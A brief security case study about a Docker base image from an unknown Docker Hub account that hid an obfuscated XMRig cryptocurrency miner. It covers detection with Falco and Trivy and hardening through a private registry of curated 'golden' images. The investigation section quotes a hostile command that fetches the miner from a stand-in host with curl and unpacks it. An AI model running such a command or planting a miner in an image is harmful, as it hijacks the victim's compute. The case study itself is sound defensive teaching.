# Case Study 03: Malicious Docker Base Image Supply Chain Attack

[⬅️ Prev: Log4j Crisis](./02_Scenario_Log4j_Zero_Day_Dependency_Crisis.md) | [Back to Scenarios](./README.md) | [Next: Overprivileged Terraform ➡️](./04_Scenario_Overprivileged_Terraform_S3_Bucket_Misconfig.md)

---

### 1. Incident Context
A developer created a new microservice and pulled an unverified base image from Docker Hub:
`FROM node-alpine-clean:latest` (uploaded by an unknown third-party account).
Hidden inside `/usr/local/bin` was an obfuscated XMRig cryptocurrency miner that activated only when the container ran for more than 2 hours.

### 2. Detection and Containment
1. **Runtime Detection (Falco)**: Falco triggered a high-severity alert:
   `Outbound network connection to stratum+tcp://pool.supportxmr.com:3333 from container order-service`
2. **Investigation**: Trivy image scan revealed hidden layers executing `curl -sL http://malicious-site/xmrig | tar -x`.

### 3. Enterprise Hardening: The Golden Image Pipeline
- **Block Public Registries**: Enforce Kubernetes admission policy allowing container image pulls **ONLY** from the private enterprise registry (`registry.corp.contoso.com`).
- **Golden Base Images**: Security engineers curate, harden, and scan approved base images (`corp/alpine`, `corp/python`, `corp/node`), updating them on a weekly automated schedule.
